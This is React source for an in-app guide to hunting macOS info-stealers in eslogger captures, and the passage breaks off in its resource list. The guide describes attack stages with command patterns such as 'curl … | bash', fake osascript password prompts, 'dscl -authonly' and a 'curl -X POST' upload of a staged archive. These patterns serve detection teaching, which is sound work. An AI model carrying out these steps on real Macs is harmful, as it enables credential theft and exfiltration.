import { Fragment, useEffect, useState, type ReactNode } from 'react';
import { MITRE_NAMES } from '../rules/mitre';
import { RULES, type Rule } from '../rules/rules';
import { RootSwatch, Wordmark } from './Brand';
import { leaveGuide, markSection } from './route';
import { CommandBlock } from './SessionScreen';
import { TRIAGE_KEYS } from './triage-model';

/*
 * The guide: how to capture macOS activity with eslogger, how to read what it records, what an intrusion looks like in
 * it, and how Gameleira helps. Facts that the app also holds (the capture command, the rules, the keys) are read from
 * the app's own tables, so the guide cannot drift from what the app does.
 */

export const GUIDE_SECTIONS = [
  { id: 'start', title: 'Where to start' },
  { id: 'capture', title: 'Capture with eslogger' },
  { id: 'events', title: 'Which events to record' },
  { id: 'anatomy', title: 'Reading an event' },
  { id: 'lineage', title: 'Where a process came from' },
  { id: 'look-for', title: 'What to look for' },
  { id: 'gameleira', title: 'Working a capture here' },
  { id: 'practice', title: 'Practice on your own Mac' },
  { id: 'jq', title: 'Beyond the app: jq' },
  { id: 'words', title: 'Words you will meet' },
  { id: 'resources', title: 'Where to learn more' },
] as const;
type SectionId = (typeof GUIDE_SECTIONS)[number]['id'];

/**
 * The stages of a typical macOS info-stealer intrusion, each with the rules that catch it. Every rule sits in exactly
 * one stage (a test checks this), so a new rule has to be placed here before it ships.
 */
export const STAGES: { name: string; what: ReactNode; rules: string[] }[] = [
  {
    name: 'Delivery',
    what: <>A fake app in a disk image, a cracked download, or a “ClickFix” page that talks the user into pasting a command
      into Terminal. Files fetched with <C>curl</C> get no quarantine flag, so Gatekeeper never looks at them.</>,
    rules: ['download', 'odd-location-exec', 'unsigned', 'adhoc'],
  },
  {
    name: 'Execution',
    what: <>The pasted command runs: <C>curl … | bash</C>, a base64 blob decoded on the fly, an AppleScript stager, an app
      that quietly opens a shell.</>,
    rules: ['shell-from-pipe', 'payload-decode', 'osascript-script', 'shell-under-app'],
  },
  {
    name: 'Getting past the defences',
    what: <>Removing the quarantine flag from what it brought, turning Gatekeeper off, trusting a certificate, or detaching
      from the parent that started it so the tree looks innocent.</>,
    rules: ['quarantine-strip', 'security-setting-change', 'orphaned'],
  },
  {
    name: 'Credential theft',
    what: <>An <C>osascript</C> dialog that looks like a system password prompt, a quiet <C>dscl . -authonly</C> to check
      the password works, then the keychain: browser “Safe Storage” keys and wallet entries.</>,
    rules: ['fake-prompt', 'dscl-authonly', 'keychain-access'],
  },
  {
    name: 'Discovery and collection',
    what: <>A few quick questions about the machine (<C>whoami</C>, <C>sw_vers</C>, <C>system_profiler</C>), then browser
      profiles, keychains, wallets, Notes and documents copied into a temporary folder and packed into an archive.</>,
    rules: ['recon', 'archive-staging'],
  },
  {
    name: 'Persistence',
    what: <>Optional, but more common in newer families: a launch agent or login item so a backdoor survives reboot.</>,
    rules: ['persistence-item', 'persistence-plist', 'launchctl-load'],
  },
];

/** A path, command or field name in running text. */
function C({ children }: { children: ReactNode }) {
  return <code className="ic">{children}</code>;
}

/** Rule explanations mark code with backticks; show those as code. */
function Ticks({ text }: { text: string }) {
  return <>{text.split('`').map((part, i) => (i % 2 === 1 ? <C key={i}>{part}</C> : <Fragment key={i}>{part}</Fragment>))}</>;
}

/** A link that leaves the page: a new tab, and nothing about this page goes with it. */
function Ext({ href, children }: { href: string; children: ReactNode }) {
  return <a href={href} target="_blank" rel="noreferrer noopener">{children}</a>;
}

/** Several lines of shell (or a jq program), with a title and Copy. No prompt marks, so a copy pastes as it is. */
function Snippet({ title, children }: { title: string; children: string }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try { await navigator.clipboard.writeText(children); setCopied(true); setTimeout(() => { setCopied(false); }, 1500); }
    catch { /* clipboard unavailable (e.g. file://): the text is selectable */ }
  };
  return (
    <div className="cmdblock script">
      <div className="cmdbar">
        <span>{title}</span>
        <button className="copy" onClick={() => { void copy(); }} aria-live="polite" aria-label={copied ? 'Copied' : `Copy: ${title}`}>
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre><code>{children}</code></pre>
    </div>
  );
}

function Note({ kind = 'note', children }: { kind?: 'note' | 'careful'; children: ReactNode }) {
  return <aside className={`gnote ${kind}`}><strong>{kind === 'careful' ? 'Careful' : 'Note'}</strong> {children}</aside>;
}

function Section({ id, n, title, children }: { id: SectionId; n: number; title: string; children: ReactNode }) {
  return (
    <section id={`g-${id}`} className="gsec" aria-labelledby={`g-${id}-h`}>
      <h2 id={`g-${id}-h`}><span className="gnum" aria-hidden="true">{String(n).padStart(2, '0')}</span>{title}</h2>
      {children}
    </section>
  );
}

const ruleById = (id: string): Rule | undefined => RULES.find(r => r.id === id);

function RuleChip({ id }: { id: string }) {
  const r = ruleById(id);
  if (!r) return null;
  return <a className="rchip" href={`#guide/rule-${id}`} onClick={e => { e.preventDefault(); goTo(`rule-${id}`); }}
    title={r.title}><C>{id}</C></a>;
}

function MitreChips({ ids }: { ids: string[] }) {
  if (ids.length === 0) return <span className="chip trait">a trait of the binary, not a technique</span>;
  return (
    <>
      {ids.map(id => (
        <Ext key={id} href={`https://attack.mitre.org/techniques/${id.replace('.', '/')}/`}>
          <span className="chip" title={MITRE_NAMES[id]}>{id}{MITRE_NAMES[id] ? ` ${MITRE_NAMES[id]}` : ''}</span>
        </Ext>
      ))}
    </>
  );
}

/** Scrolls to a section (or a rule) and points the address at it. */
function goTo(target: string): void {
  markSection(target);
  document.getElementById(`g-${target}`)?.scrollIntoView?.({ block: 'start' });
}

/** Which section is on screen, for the contents: the last one whose heading has passed the top third of the window. */
function useCurrentSection(): SectionId {
  const [current, setCurrent] = useState<SectionId>('start');
  useEffect(() => {
    if (typeof IntersectionObserver === 'undefined') return;
    const obs = new IntersectionObserver(() => {
      const passed = GUIDE_SECTIONS.filter(s => {
        const el = document.getElementById(`g-${s.id}`);
        return el !== null && el.getBoundingClientRect().top < window.innerHeight / 3;
      });
      const last = passed.at(-1);
      if (last) setCurrent(last.id);
    }, { rootMargin: '0px 0px -66% 0px' });
    for (const s of GUIDE_SECTIONS) {
      const el = document.getElementById(`g-${s.id}`);
      if (el) obs.observe(el);
    }
    return () => { obs.disconnect(); };
  }, []);
  return current;
}

export function GuideScreen({ section }: { section: string }) {
  const current = useCurrentSection();
  // Opening the guide (or following a link to one of its sections) lands on that place, not where the app was scrolled.
  useEffect(() => {
    if (section) document.getElementById(`g-${section}`)?.scrollIntoView?.({ block: 'start' });
    else document.documentElement.scrollTop = 0;
  }, [section]);

  return (
    <div className="app guide-app">
      <header className="topbar">
        <nav className="crumb" aria-label="Breadcrumb">
          <Wordmark />
          <span className="crumb-sep" aria-hidden="true">/</span>
          <span>Guide</span>
        </nav>
        <span className="spacer" />
        <button className="ghost" onClick={leaveGuide}>Back to the app</button>
      </header>
      <main className="sheet guide">
        <nav className="gtoc" aria-label="Guide contents">
          <p className="gtoc-h">Contents</p>
          <ol>
            {GUIDE_SECTIONS.map(s => (
              <li key={s.id} className={current === s.id ? 'on' : undefined}>
                <a href={`#guide/${s.id}`} aria-current={current === s.id ? 'location' : undefined}
                  onClick={e => { e.preventDefault(); goTo(s.id); }}>{s.title}</a>
              </li>
            ))}
          </ol>
        </nav>

        <article className="gbody">
          <header className="ghead">
            <p className="gkicker">Guide</p>
            <h1>Hunting macOS threats in eslogger captures</h1>
            <p className="lede">How to record what a Mac does, read the record, and recognise an intrusion in it. Written for
              people who know some Unix and some incident response, and are new to macOS. Commands are meant to be typed;
              every one of them is safe to run.</p>
          </header>

          <Section id="start" n={1} title="Where to start">
            <p>Almost every macOS investigation comes down to two questions: <em>what started this process</em>, and
              <em> what did it do</em>. Apple’s Endpoint Security framework answers both. It is the kernel-fed event stream that
              every modern Mac security product is built on, and macOS 13 Ventura and later ship a free command-line client for
              it, <C>eslogger</C>, which prints each event as one line of JSON.</p>
            <ol className="gpath">
              <li><strong>Capture.</strong> Run <C>eslogger</C> on the Mac while the activity happens (or while you reproduce
                it). <a href="#guide/capture" onClick={e => { e.preventDefault(); goTo('capture'); }}>How</a></li>
              <li><strong>Rebuild the tree.</strong> Drop the file into a session here. Gameleira links every process to the
                processes that started it.</li>
              <li><strong>Triage.</strong> Work the queue of flagged processes: confirm, dismiss, take notes.</li>
              <li><strong>Scope.</strong> From each confirmed process, follow its roots up and its children down until you know
                where the intrusion began and everything it touched.</li>
            </ol>
            <p>You need a Mac on macOS 13 or later, an administrator account, and about an hour for the practice capture in
              section 8. Knowing <C>grep</C> helps; <C>jq</C> (built into macOS 15 and later, or <C>brew install jq</C>) helps
              more.</p>
          </Section>

          <Section id="capture" n={2} title="Capture with eslogger">
            <p>Run this in Terminal on the Mac you are investigating. It records until you press Ctrl-C:</p>
            <CommandBlock />
            <p><C>sudo</C> is required: Endpoint Security clients must run as root. The rest of the line is a list of event
              types (next section), and <C>&gt; capture.jsonl</C> writes the stream to a file, one event per line.</p>

            <h3>The first run fails until Terminal has Full Disk Access</h3>
            <p><C>eslogger</C> checks that the app responsible for it is allowed Full Disk Access. Open System Settings ›
              Privacy &amp; Security › Full Disk Access and turn on Terminal (or iTerm, or whichever terminal you use), then
              quit and reopen it. Over SSH, turn on “Allow full disk access for remote users” under Sharing › Remote Login
              instead. Run as a launch daemon, <C>eslogger</C> itself needs the permission.</p>

            <h3>Its options</h3>
            <dl className="gdefs">
              <div><dt><C>eslogger &lt;event&gt; …</C></dt><dd>Subscribe to these event types, by short name. At least one is
                required.</dd></div>
              <div><dt><C>--list-events</C></dt><dd>Print every event type this Mac’s <C>eslogger</C> supports, and exit. The
                list grows with each macOS release, so this is the ground truth for the Mac in front of you.</dd></div>
              <div><dt><C>--select &lt;path&gt;</C></dt><dd>Only record events from programs whose path starts with this prefix,
                for example <C>--select /bin/zsh</C>. Can be given more than once. Handy for watching one tool; avoid it when
                hunting, because the parents and helpers you filtered out are exactly what a tree needs.</dd></div>
              <div><dt><C>--format json</C></dt><dd>The output format. JSON is the default and the only one.</dd></div>
              <div><dt><C>--oslog</C></dt><dd>Write events to the unified log instead of standard output. Messages over 32 KB are
                cut short, so a file is the better choice for a capture you will analyse.</dd></div>
              <div><dt><C>--oslog-subsystem</C>, <C>--oslog-category</C></dt><dd>Where in the unified log those events go
                (default <C>com.apple.eslogger</C>, category <C>events</C>). Changing either lowers the size limit to 1 KB
                unless you configure the log for larger messages.</dd></div>
            </dl>

            <h3>Things worth knowing before you rely on it</h3>
            <ul className="gbullets">
              <li><C>eslogger</C> only records <em>notify</em> events (“this happened”). It cannot block anything: the
                allow-or-deny <em>auth</em> events are for real security products.</li>
              <li>It leaves out its own process group, so a pipeline like <C>sudo eslogger exec | grep curl</C> does not record
                the <C>grep</C>.</li>
              <li>Apple says plainly that its output is not an API: field names can change between macOS releases. Each event
                carries a <C>schema_version</C> and a message <C>version</C> so you can tell which layout you have.</li>
              <li>Start the capture <em>before</em> the activity. A process that started earlier appears without its birth, so
                its parents are unknown (Gameleira shows these as “started before the capture”).</li>
              <li>Captures grow fast: one busy hour with the command above is easily tens of megabytes. Gameleira has loaded a
                500 MB capture; keep them shorter when you can.</li>
            </ul>
            <Note kind="careful">On a company-managed Mac, granting Full Disk Access or running <C>sudo eslogger</C> may be blocked
              by device management, or may alert your security team. Ask first, or practise on a Mac of your own.</Note>
            <p>Prefer a window to a terminal? <Ext href="https://github.com/redcanaryco/mac-monitor">Mac Monitor</Ext> records the
              same Endpoint Security events with a graphical interface, and its exported traces load here like an{' '}
              <C>eslogger</C> capture.</p>
          </Section>

          <Section id="events" n={3} title="Which events to record">
            <p>The command above asks for the events Gameleira builds on. Each one answers a question:</p>
            <table className="gtable">
              <thead><tr><th>Event</th><th>What it records</th><th>Why a hunter cares</th></tr></thead>
              <tbody>
                <tr><td><C>fork</C></td><td>A process copied itself: a new pid, linked to its parent.</td><td>Parentage: the tree’s
                  branches.</td></tr>
                <tr><td><C>exec</C></td><td>A process replaced its program: same pid, new binary, with the full command line,
                  working directory, environment and (message version 11 and later) where its input comes from.</td><td>What
                  actually ran, and with which arguments. Most findings come from here.</td></tr>
                <tr><td><C>exit</C></td><td>A process ended.</td><td>Lifetimes, and which parents were gone when their children
                  were handed to launchd.</td></tr>
                <tr><td><C>create</C>, <C>rename</C></td><td>A file was created, or moved into place.</td><td>Dropped payloads,
                  launch agent plists, archives staged for upload.</td></tr>
                <tr><td><C>unlink</C></td><td>A file was deleted.</td><td>Clean-up: the staging folder removed after the
                  upload.</td></tr>
                <tr><td><C>setextattr</C></td><td>An extended attribute was written on a file.</td><td>The quarantine flag
                  (<C>com.apple.quarantine</C>) is one.</td></tr>
                <tr><td><C>btm_launch_item_add</C>, <C>btm_launch_item_remove</C></td><td>macOS’s background task manager
                  registered (or removed) a login item, launch agent or launch daemon.</td><td>Persistence, reported by the
                  system itself.</td></tr>
              </tbody>
            </table>
            <p>Other events are worth adding when you know what you are after. Gameleira counts them in the capture header but
              does not draw them yet; read them with <a href="#guide/jq" onClick={e => { e.preventDefault(); goTo('jq'); }}>jq</a>.</p>
            <table className="gtable">
              <thead><tr><th>Event</th><th>Records</th></tr></thead>
              <tbody>
                <tr><td><C>xpc_connect</C></td><td>Which process connected to which XPC service: the causal link a parent-pid tree
                  loses.</td></tr>
                <tr><td><C>authentication</C>, <C>sudo</C>, <C>su</C></td><td>Passwords, Touch ID and privilege changes.</td></tr>
                <tr><td><C>openssh_login</C>, <C>login_login</C>, <C>screensharing_attach</C></td><td>Remote and interactive
                  logins.</td></tr>
                <tr><td><C>tcc_modify</C></td><td>A privacy permission (Full Disk Access, Accessibility, Screen Recording…)
                  granted or taken away.</td></tr>
                <tr><td><C>gatekeeper_user_override</C></td><td>The user let an app run that Gatekeeper had blocked.</td></tr>
                <tr><td><C>xp_malware_detected</C>, <C>xp_malware_remediated</C></td><td>XProtect found, or removed,
                  something.</td></tr>
                <tr><td><C>profile_add</C></td><td>A configuration profile was installed.</td></tr>
                <tr><td><C>od_create_user</C>, <C>od_modify_password</C></td><td>Local accounts created or changed.</td></tr>
                <tr><td><C>remote_thread_create</C>, <C>get_task</C></td><td>One process reaching into another: injection and
                  memory reading.</td></tr>
                <tr><td><C>write</C>, <C>open</C>, <C>close</C></td><td>Every file access. Very noisy; Gameleira reads{' '}
                  <C>write</C> if it is there, but leave these out unless you need them.</td></tr>
              </tbody>
            </table>
          </Section>

          <Section id="anatomy" n={4} title="Reading an event">
            <p>Every line is one JSON object. Look at one before anything else; on your own capture,{' '}
              <C>head -1 capture.jsonl | jq .</C> pretty-prints the first. Trimmed, an <C>exec</C> looks like this:</p>
            <Snippet title="One exec event, trimmed">{EXEC_SAMPLE}</Snippet>
            <ul className="gbullets">
              <li><C>time</C>, <C>mach_time</C> and <C>global_seq_num</C> put events in order; <C>seq_num</C> counts per event
                type.</li>
              <li><C>process</C> is <em>who did it</em>. In an <C>exec</C> it is the process <em>before</em> the exec; what it
                became is <C>event.exec.target</C>, and the command line is <C>event.exec.args</C>.</li>
              <li><C>event</C> holds exactly one key, the event type, and under it what happened.</li>
            </ul>
            <h3>The fields of a process</h3>
            <p>A process record holds much more than a pid and a parent pid. These are the ones that matter for hunting:</p>
            <table className="gtable">
              <thead><tr><th>Field</th><th>Meaning</th><th>Use</th></tr></thead>
              <tbody>
                <tr><td><C>audit_token.pid</C>, <C>.pidversion</C></td><td>The pid, and a counter that goes up each time that
                  pid is reused or execs a new program.</td><td>Pids are reused, so never key on the pid alone. Gameleira
                  identifies a process by both.</td></tr>
                <tr><td><C>ppid</C></td><td>The current parent.</td><td>Becomes 1 (launchd) when the parent exits: it can
                  lie.</td></tr>
                <tr><td><C>original_ppid</C></td><td>The parent at birth.</td><td><C>ppid</C> 1 with an <C>original_ppid</C> that
                  is a shell means something detached itself.</td></tr>
                <tr><td><C>parent_audit_token</C></td><td>The parent’s full token.</td><td>The exact parent, even after its pid
                  was reused.</td></tr>
                <tr><td><C>responsible_audit_token</C></td><td>The process macOS holds responsible: usually the app behind a
                  helper or service.</td><td>Ties work that launchd started back to the app that asked for it.</td></tr>
                <tr><td><C>group_id</C></td><td>The process group: one shell pipeline or job.</td><td>Everything in{' '}
                  <C>curl … | bash</C> shares it.</td></tr>
                <tr><td><C>session_id</C></td><td>The Unix session.</td><td>Everything started from one Terminal window or SSH
                  login shares it.</td></tr>
                <tr><td><C>tty</C></td><td>The controlling terminal, if any.</td><td>A typed-looking command with no terminal,
                  started by an app, is odd.</td></tr>
                <tr><td><C>signing_id</C>, <C>team_id</C>, <C>cdhash</C>, <C>is_platform_binary</C>,{' '}
                  <C>codesigning_flags</C></td><td>Who signed the binary, and how.</td><td>Apple, a known developer, ad-hoc, or
                  nothing at all.</td></tr>
              </tbody>
            </table>
          </Section>

          <Section id="lineage" n={5} title="Where a process came from">
            <p>macOS is Unix underneath, so processes are born the Unix way: <C>fork</C> copies a process (new pid, same
              program), <C>exec</C> swaps the program inside a pid (same pid, new binary), and <C>posix_spawn</C>, which most
              Mac software uses, does both at once. Three things make a Mac’s tree harder to read than a Linux one:</p>
            <ul className="gbullets">
              <li><strong>launchd is the parent of almost everything.</strong> It is pid 1. Apps opened from the Finder, the
                Dock, Spotlight or <C>open</C> are started by launchd on the user’s behalf, so their parent is 1, not the thing
                the user clicked in.</li>
              <li><strong>Orphans are adopted.</strong> When a parent exits, launchd takes its children. Malware uses this on
                purpose (a double fork, <C>nohup</C>, <C>&amp;</C>, <C>launchctl submit</C>) to look as if it came from
                nowhere.</li>
              <li><strong>XPC hides cause.</strong> Instead of starting a helper itself, a process can send a message to a named
                service and let launchd start it. The helper’s parent is launchd; the process that caused it is only visible
                through the responsible process, or an <C>xpc_connect</C> event.</li>
            </ul>
            <p>So Gameleira follows three roots for every process, and the Tree tab lets you pick which one to hang the tree
              from:</p>
            <dl className="groots">
              <div><dt><RootSwatch kind="original" />Original parent</dt><dd>Who forked it. Survives the parent’s exit. The
                default, and usually the truth.</dd></div>
              <div><dt><RootSwatch kind="current" />Current parent</dt><dd>Who it sits under now. An orphan sits under launchd,
                which is what <C>ps</C> would show you.</dd></div>
              <div><dt><RootSwatch kind="responsible" />Responsible</dt><dd>The app macOS holds accountable. Reconnects helpers
                and services to the app behind them.</dd></div>
            </dl>
            <p>When the three disagree, the disagreement is itself a lead: a shell whose current parent is launchd but whose
              original parent was an app from Downloads went out of its way to look unrelated.</p>
          </Section>

          <Section id="look-for" n={6} title="What to look for">
            <p>Info-stealers are the most common macOS threat today: Atomic Stealer (AMOS), Poseidon, Banshee, Cuckoo and their
              relatives. They are worth learning first, because they follow a recognisable shape, and many other intrusions
              reuse its parts. Here is that shape, stage by stage, with the Gameleira rules that catch each one:</p>
            <ol className="stages">
              {STAGES.map(s => (
                <li key={s.name}>
                  <h3>{s.name}</h3>
                  <p>{s.what}</p>
                  <p className="rchips">{s.rules.map(id => <RuleChip key={id} id={id} />)}</p>
                </li>
              ))}
              <li>
                <h3>Exfiltration</h3>
                <p>The archive leaves, usually as <C>curl -X POST -F file=@/tmp/….zip https://…</C>. No rule flags an upload
                  on its own yet: look at the <C>curl</C> commands under a flagged chain, and at their arguments.</p>
              </li>
            </ol>

            <h3>Where persistence hides</h3>
            <table className="gtable">
              <thead><tr><th>Place</th><th>Look with</th></tr></thead>
              <tbody>
                <tr><td><C>~/Library/LaunchAgents</C></td><td><C>ls -la</C>, then <C>plutil -p</C> on each plist</td></tr>
                <tr><td><C>/Library/LaunchAgents</C>, <C>/Library/LaunchDaemons</C> (daemons run as root)</td><td>the
                  same</td></tr>
                <tr><td>Login items and everything the background task manager knows</td><td><C>sudo sfltool dumpbtm</C></td></tr>
                <tr><td>Shell start-up files: <C>~/.zshrc</C>, <C>~/.zprofile</C>, <C>/etc/zshrc</C></td><td><C>grep</C> for{' '}
                  <C>curl</C>, <C>base64</C>, <C>osascript</C></td></tr>
                <tr><td>cron and periodic jobs</td><td><C>crontab -l</C></td></tr>
                <tr><td>Configuration profiles</td><td><C>profiles list</C>, or System Settings › Device Management</td></tr>
              </tbody>
            </table>
            <p>In a launch plist, read <C>ProgramArguments</C> (what runs), <C>RunAtLoad</C> and <C>KeepAlive</C> (how it stays
              running) and <C>Label</C>, which often imitates Apple: a <C>com.apple.…</C> label in a <em>user’s</em> folder is a
              red flag.</p>

            <h3>Every rule Gameleira applies</h3>
            <p>Severity is how strongly a finding suggests something worth your time; a flag is a lead, never a verdict. The
              full matching logic is in <C>src/rules/rules.ts</C>, and every finding in the app says which trigger it matched.</p>
            <ul className="grules">
              {RULES.map(r => (
                <li key={r.id} id={`g-rule-${r.id}`}>
                  <div className="grule-h">
                    <span className={`badge sev-${r.severity}`}>{r.severity}</span>
                    <strong>{r.title}</strong>
                    <C>{r.id}</C>
                  </div>
                  <p><Ticks text={r.explanation} />{r.gated === 'always' && ' Context only, unless the process is in a flagged chain or a recon burst.'}
                    {r.gated === 'when-low' && ' Its low findings are context only, unless the process is in a flagged chain.'}</p>
                  <p className="mitre"><MitreChips ids={r.mitre} /></p>
                </li>
              ))}
            </ul>
          </Section>

          <Section id="gameleira" n={7} title="Working a capture here">
            <ol className="gsteps">
              <li><strong>One session per investigation</strong>, usually one Mac. Verdicts, notes and routine marks are kept in
                this browser; the capture is read here and never uploaded.</li>
              <li><strong>Drop the capture</strong> into the session. More captures of the same Mac can join it.</li>
              <li><strong>Triage.</strong> The queue lists what the rules flagged, high first. Pick a row and read <em>Why
                flagged</em>, then <em>Launched by</em>, which draws each root of the process side by side. Confirm it,
                dismiss it as benign, or leave a note.</li>
              <li><strong>Tree.</strong> Every process, hung from the root you choose. Unflagged processes fold into grey rows;
                search keeps the matches and their ancestors.</li>
              <li><strong>Confirmed.</strong> Your confirmed processes across every capture, and the export: the session as
                JSON, with command lines redacted if you ask.</li>
            </ol>
            <h3>Keys on the Triage tab</h3>
            <dl className="keys">
              {TRIAGE_KEYS.map(k => <div key={k.key}><dt><kbd>{k.key}</kbd></dt><dd>{k.what}</dd></div>)}
            </dl>
            <h3>Marks on a row</h3>
            <dl className="gdefs">
              <div><dt><span className="chain-mark">in chain</span></dt><dd>Did little itself, but descends from a process with a
                medium or high finding. A <C>whoami</C> is nothing alone; under a shell fed from a pipe it is probably part of
                the same intrusion. Look at the parent first.</dd></div>
              <div><dt>recon burst</dt><dd>Three or more different discovery tools under one parent within a minute.</dd></div>
              <div><dt>context only</dt><dd>Weak signals (a <C>ps</C>, an ad-hoc signed Homebrew tool) on a process outside any
                flagged chain. Kept out of the queue and shown in the process’s detail pane.</dd></div>
              <div><dt>routine</dt><dd>A program you marked as normal on this Mac. Its runs are hidden, except rows with a high or
                persistence finding, which always stay.</dd></div>
            </dl>
            <h3>Scoping: questions to answer for every confirmed process</h3>
            <ul className="gchecks">
              <li>What was the <em>first</em> suspicious process, and where did it really come from? Compare its three
                roots.</li>
              <li>Its whole subtree: every program it ran, and with which arguments.</li>
              <li>Every file it, or anything under it, created, renamed or deleted.</li>
              <li>Any persistence: a launch item registered, or a plist written into a <C>LaunchAgents</C> folder.</li>
              <li>Any credential access: a fake prompt, <C>dscl -authonly</C>, the keychain, <C>sudo</C>.</li>
              <li>Where data went: the URLs and hosts in its <C>curl</C> arguments.</li>
              <li>What else ran in the same session or process group.</li>
              <li>The timeline: its first and last events, in order.</li>
            </ul>
          </Section>

          <Section id="practice" n={8} title="Practice on your own Mac">
            <p>The fastest way to learn to read a capture is to make one of something you did yourself. The script below acts
              out the shape of an info-stealer without stealing anything: it downloads a web page, pipes a command into{' '}
              <C>bash</C>, shows a harmless dialog, zips a copy of <C>/etc/hosts</C>, detaches a <C>sleep</C>, opens Calculator
              and installs a launch agent that writes the date to a file.</p>
            <Note kind="careful">Only ever practise with harmless commands like these. Never run real malware samples on a Mac
              you use for anything else.</Note>
            <p><strong>In one Terminal window</strong>, start recording:</p>
            <CommandBlock />
            <p><strong>In a second window</strong>, play the attacker:</p>
            <Snippet title="Terminal, second window: the fake intrusion">{LAB_SCRIPT}</Snippet>
            <p>Press Ctrl-C in the first window, create a session here and drop <C>capture.jsonl</C> into it. You should
              find:</p>
            <table className="gtable">
              <thead><tr><th>What you did</th><th>What to find</th></tr></thead>
              <tbody>
                <tr><td><C>curl … -o /tmp/page.html</C></td><td><RuleChip id="download" /> No quarantine flag on the file: check
                  with <C>xattr -l /tmp/page.html</C>.</td></tr>
                <tr><td><C>echo … | bash</C></td><td><RuleChip id="shell-from-pipe" /> and its <C>whoami</C>, queued{' '}
                  <span className="chain-mark">in chain</span>.</td></tr>
                <tr><td>The dialog</td><td><RuleChip id="fake-prompt" /> with the full AppleScript in the evidence.</td></tr>
                <tr><td><C>ditto -c -k … /tmp/stage.zip</C></td><td><RuleChip id="archive-staging" />, high, because it staged
                  in <C>/tmp</C>.</td></tr>
                <tr><td><C>(sleep 90 &amp;)</C></td><td><RuleChip id="orphaned" />: its current parent is launchd, its original
                  parent the subshell. Switch the Tree between parent modes and watch it move.</td></tr>
                <tr><td><C>open -a Calculator</C></td><td>Nothing flagged. Find it in the Tree: launchd started it (by way of{' '}
                  <C>xpcproxy</C>) and it is its own responsible process, so nothing links it to the <C>open</C> you typed.
                  That is the gap section 5 describes.</td></tr>
                <tr><td>The launch agent</td><td><RuleChip id="persistence-plist" /> or <RuleChip id="persistence-item" /> on the
                  process that wrote the plist, and <RuleChip id="launchctl-load" />. Later, the <C>sh -c date …</C> the agent runs,
                  started by launchd with no link back to you: only the plist ties them together.</td></tr>
              </tbody>
            </table>
            <p>macOS will probably also show a “Background Items Added” notification: that is the background task manager noticing
              your launch agent, the same thing <C>btm_launch_item_add</C> recorded. When you are done, clean up:</p>
            <Snippet title="Terminal: remove what the practice left behind">{LAB_CLEANUP}</Snippet>
            <p>Keep the capture: it is a good file to try the next section’s commands on.</p>
          </Section>

          <Section id="jq" n={9} title="Beyond the app: jq">
            <p>Gameleira draws the tree; for everything else, a capture is a text file, and <C>jq</C> reads it. These work on
              captures from macOS 13 onwards; if a field comes back <C>null</C>, look at one event with <C>head -1 … | jq .</C>
              and adjust the path. That adjustment is most of the skill.</p>
            <Snippet title="Which event types are in the capture">{`jq -r '.event | keys[]' capture.jsonl | sort | uniq -c | sort -rn`}</Snippet>
            <Snippet title="Every command line that ran, most frequent first">{`jq -r 'select(.event.exec) | .event.exec.args | join(" ")' capture.jsonl | sort | uniq -c | sort -rn | head -40`}</Snippet>
            <Snippet title="Each exec as pid, parent, original parent, process group, responsible pid, program">{`jq -c 'select(.event.exec) | .event.exec.target | [.audit_token.pid, .ppid, .original_ppid, .group_id, .responsible_audit_token.pid, .executable.path]' capture.jsonl`}</Snippet>
            <Snippet title="Orphans: now under launchd, born under something else">{`jq -c 'select(.event.exec) | .event.exec.target | select(.ppid == 1 and .original_ppid != 1) | {path: .executable.path, ppid, original_ppid}' capture.jsonl`}</Snippet>
            <Snippet title="Everything in one process group (a pipeline); put its id in g">{`jq -c --argjson g 12345 'select(.event.exec) | .event.exec.target | select(.group_id == $g) | [.audit_token.pid, .executable.path]' capture.jsonl`}</Snippet>
            <Snippet title="Launch items registered, and the plist or app behind each">{`jq -r 'select(.event.btm_launch_item_add) | .event.btm_launch_item_add.item.item_url' capture.jsonl`}</Snippet>
            <Snippet title="Live: every program a zsh starts, as it happens">{`sudo eslogger exec | jq -r 'select(.process.executable.path == "/bin/zsh") | "\\(.process.audit_token.pid): \\(.event.exec.target.executable.path)"'`}</Snippet>
            <p>No <C>jq</C> on the machine? <C>grep</C> still gets you far: <C>grep -c . capture.jsonl</C> counts events, and{' '}
              <C>grep -o '"path":"[^"]*"' capture.jsonl | sort | uniq -c | sort -rn | head</C> lists the busiest paths.</p>
          </Section>

          <Section id="words" n={10} title="Words you will meet">
            <dl className="gwords">
              {WORDS.map(([w, d]) => <div key={w}><dt>{w}</dt><dd>{d}</dd></div>)}
            </dl>
          </Section>

          <Section id="resources" n={11} title="Where to learn more">
            <div className="gres">
              <section>
                <h3>The Mitten Mac</h3>
                <p>Jaron Bradley’s site on macOS incident response and threat hunting.</p>
                <ul>
                  <li><Ext href="https://themittenmac.com/threat-hunting-book">Threat Hunting macOS</Ext>, his book on hunting with
                    Endpoint Security data</li>
                  <li><Ext href="https://github.com/themittenmac/TrueTree">TrueTree</Ext>, a <C>pstree</C> for macOS that follows the
                    real parent: run it once next to <C>ps</C></li>
                  <li><Ext href="https://themittenmac.com/blog">Blog</Ext>, <Ext href="https://themittenmac.com/tools">tools</Ext> and{' '}
                    <Ext href="https://themittenmac.com/macos-threat-hunting-training">training</Ext></li>
                </ul>
              </section>
              <section>
                <h3>Objective-See</h3>
                <p>Patrick Wardle’s non-profit: free Mac security tools, books and research.</p>
                <ul>
                  <li><Ext href="https://taomm.org/vol1/read.html">The Art of Mac Malware, Vol. I: Analysis</Ext> and{' '}
                    <Ext href="https://taomm.org/vol2/read.html">Vol. II: Detection</Ext>, free to read online</li>
                  <li><Ext href="https://objective-see.org/blog/blog_0x84.html">The Mac Malware of 2025</Ext>, the yearly tour of new
                    families (<Ext href="https://objective-see.org/blog.html">all posts</Ext>)</li>
                  <li><Ext href="https://objective-see.org/tools.html">Tools</Ext>, including KnockKnock and BlockBlock for persistence
                    and LuLu for network connections; <Ext href="https://github.com/objective-see/ProcessMonitor">ProcessMonitor</Ext>,
                    an Endpoint Security process viewer</li>
                  <li><Ext href="https://objectivebythesea.org/">Objective by the Sea</Ext>, the Mac security conference, whose talks
                    are online</li>
                </ul>
              </section>
              <section>
                <h3>Apple and MITRE</h3>
                <ul>
                  <li><Ext href="https://developer.apple.com/documentation/endpointsecurity">Endpoint Security</Ext>, the framework
                    reference: every event type and process field. <C>man eslogger</C> on your Mac covers the command.</li>
                  <li><Ext href="https://support.apple.com/guide/security/welcome/web">Apple Platform Security</Ext>: how
                    Gatekeeper, TCC, SIP and XProtect work</li>
